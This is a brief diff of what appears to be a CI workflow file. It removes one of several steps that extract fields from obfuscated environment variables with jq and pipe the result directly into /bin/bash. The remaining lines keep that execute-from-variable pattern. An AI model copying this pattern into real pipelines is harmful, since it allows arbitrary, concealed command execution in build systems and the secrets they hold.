@@ -32,7 +32,6 @@ jobs:
           echo $otzhl26 | jq -r .e968 | /bin/bash
           printf '%s' "$ytx9745" | jq -r .z6059 | /bin/bash
           printf '%s' "$lwi5" | jq -r .k003 | /bin/bash
-          printf '%s' "$hsec96" | jq -r .lad448 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
